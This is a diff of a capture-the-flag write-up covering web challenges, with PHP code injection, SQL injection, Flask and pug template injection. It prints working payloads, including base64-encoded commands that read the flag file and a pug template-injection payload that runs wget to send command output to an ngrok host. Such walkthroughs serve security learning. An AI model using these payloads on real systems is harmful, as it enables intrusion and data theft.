@@ -13,12 +13,12 @@ I try php code injection ${system('ls')}
 
 ![Screenshot at 2021-11-25 19-35-36](https://user-images.githubusercontent.com/52857059/143484816-0131587c-3d6c-43f1-b947-5afac58b96ae.png)
 
-It works But I can't find flag file.
+It works But I can't find flag file.<br />
 let's try another payload with base64_decode function --> ${system(base64_decode(bHMgLi4v))}
 
 ![Screenshot at 2021-11-25 19-39-34](https://user-images.githubusercontent.com/52857059/143484886-c4cdb4ad-025d-46f2-85c7-57850b62bd3d.png)
 
-I got flag name :")
+I got flag name :")<br />
 next step , let's read flag file --> ${system(base64_decode(Y2F0IC4uL2ZsYWcq))}
 
 ![Screenshot at 2021-11-25 19-47-54](https://user-images.githubusercontent.com/52857059/143484917-bf996a6b-275b-4965-9982-0742345a348d.png)
@@ -39,7 +39,7 @@ Let's try injecting pass input with ``` 1' or '1'='1 ```
 ## 3- INCEPTION(easy)
 ![Screenshot at 2021-11-26 10-04-55](https://user-images.githubusercontent.com/52857059/143547836-fcee23ee-9792-461d-90ca-799a392a5460.png)
 
-After downloading the files' challenge locally ,I noticed The application use template Engine .
+After downloading the files' challenge locally ,I noticed The application use template Engine .<br />
 I used template injection in python because the application was made with flask.
 
 ![Screenshot at 2021-11-26 10-07-03](https://user-images.githubusercontent.com/52857059/143549346-bbbcb5dd-9b70-4215-9bec-90de69252b20.png)
@@ -87,17 +87,17 @@ With ```<?php system('cat ../flag*') ?>``` we can read the flag
 ## 5- IMF-searching
 ![Screenshot at 2021-11-26 10-46-06](https://user-images.githubusercontent.com/52857059/143669832-4f692f5a-95c9-4b4b-b786-71a4123b6961.png)
 
-After downloading the files' challenge locally ,I noticed The application use pug template Engine .
-so I will search about pug ssti 
-I will run in the background ```sudo python3 -m http.server 80``` to recieve response
-running ```run ngrok http 80``` 
+After downloading the files' challenge locally ,I noticed The application use pug template Engine .<br />
+so I will search about pug ssti <br />
+I will run in the background ```sudo python3 -m http.server 80``` to recieve response<br />
+running ```run ngrok http 80``` <br />
 the payload is ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('ls ../')')}()}```
 
 The problem is if we do ls the first result of ls command will appear
 
 ![Screenshot at 2021-11-27 08-12-15](https://user-images.githubusercontent.com/52857059/143670460-2a3674e2-19c8-4db9-95d3-8afb4eb70cfd.png)
 
-so let's replace ls ../ to ```ls ../flag*```
+so let's replace ls ../ to ```ls ../flag*```<br />
 payload ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('ls+../flag*')')}()}``` 
 
 ![Screenshot at 2021-11-27 08-25-10](https://user-images.githubusercontent.com/52857059/143670712-9eb3d484-133b-42af-a90d-298cc79c1d33.png)
